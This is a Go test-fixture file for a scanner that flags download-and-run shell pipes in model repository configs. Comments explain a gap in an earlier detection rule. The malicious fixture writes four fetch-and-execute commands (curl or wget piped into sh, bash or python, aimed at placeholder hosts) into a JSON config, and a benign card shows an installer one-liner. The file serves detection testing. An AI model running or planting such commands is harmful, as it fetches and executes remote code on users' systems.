package main

// shellPipeFixtures writes the two sides of the composed download-and-run check.
//
// The rule claimed to cover "a pipe into an interpreter (curl | sh, wget -qO-)",
// but the only needle was the literal "curl | sh", which matches the spelling with
// nothing between the command and the pipe — that is, no payload anyone writes. The
// validity-oracle lab measured it: a model's own metadata value of
//
//	sh -c 'curl -s http://198.51.100.9/x | sh'
//
// reported SC4N-STRING-RAW-IP-URL and not SC4N-STRING-SHELL, and so did
// `curl -fsSL http://198.51.100.7/x.sh | bash`.
//
// The pipe into an interpreter is now a needle of its own, kept only when a
// download command precedes it on the same line — and left out of the card tier,
// because "Install it with curl … | bash" is how a project documents an installer
// and the bytes are identical to a payload. The three fixtures below pin all three
// halves: the payload in a config is reported, the table is not, and the card's own
// installation section is not.
func init() {
	register(contributor{
		name:     "shell-pipe",
		fixtures: shellPipeFixtures,
		expectations: func() (malicious, benign map[string]expectation) {
			return map[string]expectation{
				"shell_pipe_config.json": {
					Expect: []string{"SC4N-STRING-SHELL", "SC4N-STRING-RAW-IP-URL"},
					Notes: "Four spellings of the same chain in a config value: the canonical install " +
						"pipe, the `sh -c` wrapper a metadata value carries, a script-pipe, and the " +
						"minified `curl x|sh`. Before the pipe became a composed indicator all four " +
						"reported only SC4N-STRING-RAW-IP-URL, or nothing when the URL was a hostname.",
				},
			}, map[string]expectation{
				"benign/shell_pipe_card.md": {
					Forbid: []string{"SC4N-STRING-SHELL"},
					Notes: "The two false-positive classes the check has to keep out, both in a card. " +
						"A download piped into an installer (`curl -LsSf https://… | bash`) is exactly how " +
						"mistralai/Mistral-Large-4-1T-A52B documents its CLI, and it made the composed " +
						"pipe the top25-trending corpus's only new high finding; and a Markdown table with " +
						"a `sh` column must never be a finding either.",
				},
			}
		},
	})
}

func shellPipeFixtures(f *fixtureSet) {
	f.addText("shell_pipe_config.json",
		"{\n"+
			"  \"installer\": \"curl -fsSL http://198.51.100.7/x.sh | bash\",\n"+
			"  \"hook\": \"sh -c 'curl -s http://198.51.100.9/x | sh'\",\n"+
			"  \"setup\": \"wget -qO- https://example.invalid/p.py | python\",\n"+
			"  \"minified\": \"curl http://10.0.0.1/x|sh\"\n"+
			"}\n")

	f.addText("benign/shell_pipe_card.md",
		"# Install\n\n"+
			"Install the CLI with the one-line installer:\n\n"+
			"```bash\n"+
			"curl -LsSf https://example.invalid/vibe/install.sh | bash\n"+
			"```\n\n"+
			"# Interpreter support\n\n"+
			"| shell | note |\n"+
			"|---|---|\n"+
			"| sh | POSIX, always present |\n"+
			"| bash | GNU extensions |\n"+
			"| zsh | completion |\n")
}
